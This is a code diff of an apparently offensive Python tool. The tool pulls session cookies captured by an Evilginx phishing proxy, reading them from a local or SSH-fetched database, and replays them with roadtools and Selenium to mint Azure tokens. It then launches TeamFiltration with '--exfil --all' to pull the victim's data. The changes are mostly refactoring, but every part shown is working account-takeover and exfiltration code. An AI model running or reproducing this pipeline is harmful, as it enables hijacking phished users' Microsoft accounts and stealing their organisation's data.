@@ -4,24 +4,23 @@ import argparse
 import paramiko
 import threading
 import time
-from colorama import init, Fore
-from concurrent.futures import ThreadPoolExecutor
 import json
 import codecs
 import platform
 import sys
 import requests
-
+from colorama import init, Fore
+from concurrent.futures import ThreadPoolExecutor
 
 from selenium import webdriver
 from seleniumwire import webdriver as webdriver_wire
 
-# Road tools deps
+# Import only necessary modules from roadtools.roadlib
 from roadtools.roadlib.auth import Authentication
 from roadtools.roadlib.deviceauth import DeviceAuthentication
 from roadtools.roadtx.selenium import SeleniumAuthentication
 
-# Initialize colorama
+# Initialize colorama for colored output
 init(autoreset=True)
 
 # Define log icons
@@ -29,6 +28,8 @@ INFO_ICON = Fore.CYAN + "[INFO] "
 SUCCESS_ICON = Fore.GREEN + "[SUCCESS] "
 ERROR_ICON = Fore.RED + "[ERROR] "
 WARNING_ICON = Fore.YELLOW + "[WARNING] "
+
+# Initialize the Pushover client to send notifications
 pushClient = None
 
 class PushoverClient:
@@ -145,10 +146,6 @@ def execute_authentication(estscookie, username, resourceUri, clientId, redirect
         auth.verify =  False
         deviceauth.verify = False
         auth.tenant = None
-        #    def __init__(self, auth, deviceauth, redirurl, proxy=None):
-        #print(f"Redir:{redirectUrl}")
-        #print(f"res:{resourceUri}")
-        #print(f"id:{clientId}")
         selauth = LazySeleniumAuthentication(auth, deviceauth, redirectUrl, None)
        
 
@@ -171,29 +168,27 @@ def execute_authentication(estscookie, username, resourceUri, clientId, redirect
         outfilePath = f"{safeUserName}_roadtools_auth"
         with codecs.open(outfilePath, 'w', 'utf-8') as outfile:
             json.dump(tokendata, outfile)
-            print(INFO_ICON + f'Tokens were written to {outfilePath}')
+        print(INFO_ICON + f'Tokens were written to {outfilePath}')
+    
+        if is_teamfiltration_present():
+            binary_name = "TeamFiltration"
+            if platform.system() == "Windows":
+                binary_name += ".exe"
+            process = subprocess.Popen(f"{binary_name} --outpath {safeUserName} --exfil --all  --roadtools {outfilePath}",  stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         
-            if is_teamfiltration_present():
-                binary_name = "TeamFiltration"
-                if platform.system() == "Windows":
-                    binary_name += ".exe"
-
-                process = subprocess.Popen(f"{binary_name} --outpath {safeUserName} --exfil --all  --roadtools {outfilePath}",  stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-            
-                # Display the output as it is generated
-                while True:
-                    output = process.stdout.readline()
-                    if output == '' and process.poll() is not None:
-                        break
-                    if output:
-                        print(output.strip())
-
-                # Capture any remaining output
-                stdout, stderr = process.communicate()
-                if stdout:
-                    print(stdout.strip())
-                if stderr:
-                    print(stderr.strip(), file=sys.stderr)
+            # Display the output as it is generated
+            while True:
+                output = process.stdout.readline()
+                if output == '' and process.poll() is not None:
+                    break
+                if output:
+                    print(output.strip())
+            # Capture any remaining output
+            stdout, stderr = process.communicate()
+            if stdout:
+                print(stdout.strip())
+            if stderr:
+                print(stderr.strip(), file=sys.stderr)
 
     except Exception as e:
         print(ERROR_ICON + f"Authentication error: {e}")
@@ -295,10 +290,10 @@ if __name__ == "__main__":
     """
     print(Fore.CYAN + banner)
 
-    parser = argparse.ArgumentParser(description="Extract tokens from a database.")
-    parser.add_argument("database_path", help="Path to the local OR remote database file.")
+    parser = argparse.ArgumentParser(description="Evilginx database location")
+    parser.add_argument("database_path", help="Path to the local OR remote Evilginx database file.")
 
-    ssh_group = parser.add_argument_group('SSH Options', 'Options for fetching the evilginx database from a remote host via SSH')
+    ssh_group = parser.add_argument_group('SSH Options', 'Options for fetching the Evilginx database from a remote host via SSH')
     ssh_group.add_argument("--host", help="SSH hostname/IP when fetching from a remote host.")
     ssh_group.add_argument("--port", type=int, default=22, help="SSH port when fetching from a remote host.")
     ssh_group.add_argument("--username", help="SSH username when fetching from a remote host.", default="root")
@@ -370,4 +365,4 @@ if __name__ == "__main__":
             for key, tokenData in initial_combinations.items():
                 with ThreadPoolExecutor() as executor:
                     executor.submit(execute_authentication, tokenData, key.split(':')[0], args.resource, args.client, args.redirect_url, args.driver_path, args.keep_open)
-            time.sleep(10000)
+            #time.sleep(10000)
